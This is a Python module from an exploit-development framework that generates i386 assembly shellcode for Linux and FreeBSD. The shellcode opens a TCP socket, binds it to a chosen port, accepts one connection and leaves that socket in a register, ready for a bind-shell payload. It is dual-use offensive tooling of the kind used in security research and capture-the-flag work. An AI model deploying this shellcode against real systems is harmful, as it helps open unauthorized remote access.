from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def listen(port, os = None):
    """Args: port
    Waits for a connection.  Leaves socket in EBP."""

    if os == 'freebsd':
        return """
        ;; Listens for and accepts a connection on %(portnum)d
        ;; Socket file descriptor is placed in EBP

        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socket
        pop eax
        cdq
        push edx
        push SOCK_STREAM
        push AF_INET
        push edx
        int 0x80

        ;; bind(sock, &addr, sizeof addr); // sizeof addr == 0x10
        push 0x10 | (AF_INET << 8) | (%(port)d << 16) ;; sa_len and sa_family does't really matter, but why not set them right?
        mov ebx, esp
        push 0x10
        push ebx
        push eax
        push eax
        mov al, SYS_bind
        int 0x80

        ;; listen(sock, whatever)
        mov al, SYS_listen
        int 0x80

        ;; accept(sock, NULL, whatever)
        pop ebx
        push edx
        push ebx
        push ebx
        mov al, SYS_accept
        int 0x80

        push ebx
        push eax
        mov al, SYS_close
        int 0x80
        pop ebp
""" % {'port'    : htons(int(port)),
       'portnum' : int(port)}
    elif os == 'linux':
        return """
        ;; Listens for and accepts a connection on %(portnum)d
        ;; Socket file descriptor is placed in EBP

        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socketcall
        pop eax
        push SYS_socketcall_socket
        pop ebx
        cdq                     ; clear EDX
        push edx                ; IPPROTO_IP (= 0)
        push ebx                ; SOCK_STREAM
        push AF_INET
        mov ecx, esp
        int 0x80

        ;; bind(sock, &addr, sizeof addr); // sizeof addr == 0x10
        push edx
        push word %(port)d
        push word AF_INET
        mov ecx, esp
        push 0x10
        push ecx
        push eax
        mov ecx, esp
        mov esi, eax
        inc ebx                 ; EBX = bind (= 2)
        mov al, byte SYS_socketcall
        int 0x80

        ;; listen(sock, whatever)
        mov al, byte SYS_socketcall
        shl ebx, 1              ; EBX = listen (= 4)
        int 0x80

        ;; accept(sock, NULL, NULL)
        push edx
        push esi                ; sock
        mov ecx, esp
        inc ebx                 ; EBX = accept (= 5)
        mov al, byte SYS_socketcall
        int 0x80

        xchg eax, ebp

        ;; close(sock)
        xchg ebx, esi
        push byte SYS_close
        pop eax
        int 0x80
""" % {'port'    : htons(int(port)),
       'portnum' : int(port)}
    else:
        bug('OS was neither linux nor freebsd')
